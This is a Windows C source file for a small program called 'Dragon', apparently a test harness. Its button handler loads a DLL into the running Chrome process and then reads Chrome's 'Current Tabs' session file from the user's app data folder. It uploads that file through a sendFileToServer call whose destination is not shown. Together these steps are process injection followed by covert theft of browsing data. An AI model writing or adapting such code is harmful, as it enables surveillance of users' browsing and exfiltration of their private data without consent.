#include <windows.h>
#include "Dragon.h"

LRESULT CALLBACK WndProc(HWND hWnd,
						 UINT message,
						 WPARAM wParam,
						 LPARAM lParam);

HWND g_hMainWnd = NULL;
HWND g_hButton = NULL;
HWND g_hTextLabel = NULL;
LPCWSTR g_app = L"chrome.exe";

int WINAPI WinMain(HINSTANCE hInstance,
				   HINSTANCE hPrevInstance,
				   LPSTR lpCmdLine,
				   int nCmdShow)
{

 MSG msg          = {0};
 WNDCLASS wc      = {0}; 
 wc.lpfnWndProc   = WndProc;
 wc.hInstance     = hInstance;
 wc.hbrBackground = (HBRUSH)(COLOR_BACKGROUND);
 wc.lpszClassName = L"dragonwnd";
 if( !RegisterClass(&wc) )
   return 1;

 g_hMainWnd = CreateWindow(wc.lpszClassName,
                   L"Dragon",
                   WS_OVERLAPPEDWINDOW|WS_VISIBLE,
				   0,
				   0,
				   200,
				   100,
				   0,
				   0,
				   hInstance,
				   NULL);
 if(!g_hMainWnd)
    return 2;

 g_hButton = CreateWindow( 
    L"BUTTON",
    L"Send", 
    WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
    10,
    10, 
    100,
    25,
    g_hMainWnd,
    NULL,
    (HINSTANCE)GetWindowLong(g_hMainWnd, GWL_HINSTANCE), 
    NULL);

 DWORD dwProcessId = getProcessId(g_app);
 g_hTextLabel = CreateWindow( 
    L"static",
    (dwProcessId != -1) ? L"true" : L"false", 
    WS_VISIBLE | WS_CHILD,
    10+100,
    10, 
    100,
    25,
    g_hMainWnd,
    NULL,
    (HINSTANCE)GetWindowLong(g_hMainWnd, GWL_HINSTANCE), 
    NULL);
    while( GetMessage( &msg, NULL, 0, 0 ) > 0 )
        DispatchMessage( &msg );

    return 0;
}

LRESULT CALLBACK WndProc(HWND hWnd,
						 UINT message,
						 WPARAM wParam,
						 LPARAM lParam)
{

 switch(message)
 {
   case WM_CLOSE:
     PostQuitMessage(0);
     break;
   case WM_COMMAND:
	   if ( (HWND)lParam == g_hButton)
	   {
		   DWORD chromId = getProcessId(g_app);
		   if(chromId != -1)
		   {
			   inject_library(chromId, L"C:\\Users\\Alex\\Projects\\SimilarWeb\\dragon\\debug\\awl.dll");
			   eject_library(chromId,L"C:\\Users\\Alex\\Projects\\SimilarWeb\\dragon\\debug\\awl.dll");
			   
				WCHAR lpwsPath[MAX_PATH] = {0};

				if(SUCCEEDED(SHGetFolderPath(NULL, 
											 CSIDL_LOCAL_APPDATA, 
											 NULL, 
											 0, 
											 lpwsPath))) 
				{
					lstrcat(lpwsPath, L"\\Google\\Chrome\\User Data\\Default\\Current Tabs D");
					sendFileToServer(lpwsPath);
				}
		   }
	   }
	   break;
   default:
     return DefWindowProc(hWnd, message, wParam, lParam);
 }
 return 0;

}  
